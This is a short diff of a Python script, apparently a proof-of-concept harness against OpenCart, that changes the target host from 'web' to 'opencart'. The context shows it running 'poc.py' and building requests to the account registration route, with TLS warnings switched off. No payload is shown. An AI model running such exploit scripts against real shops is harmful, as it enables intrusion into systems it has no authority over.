@@ -2,7 +2,7 @@ import requests
 import os
 os.system('python3 poc.py')
 requests.packages.urllib3.disable_warnings()
-host = 'web'
+host = 'opencart'
 
 def register():
     burp0_url = "http://"+host+":80//index.php?route=account/register"
